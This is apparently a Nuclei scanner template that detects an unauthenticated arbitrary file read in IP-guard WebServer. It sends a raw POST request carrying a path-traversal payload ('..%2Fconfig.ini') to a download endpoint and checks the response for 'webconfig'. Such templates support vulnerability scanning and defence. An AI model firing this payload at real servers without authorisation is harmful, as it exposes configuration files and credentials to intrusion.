id: ipguard-webserver-fileread

info:
  name: ipguard-webserver-fileread
  author: HB
  severity: critical
  description: 由于IP-guard WebServer的权限验证机制中存在设计缺陷，远程攻击者能够规避安全验证，通过后端接口执行文件的任意读取和删除操作。

http:
- raw:
  - |-
    @timeout: 30s
    POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 64

    path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A

  matchers:
    - type: dsl
      dsl:
        - 'status_code==200 && contains_all(body,"webconfig")'

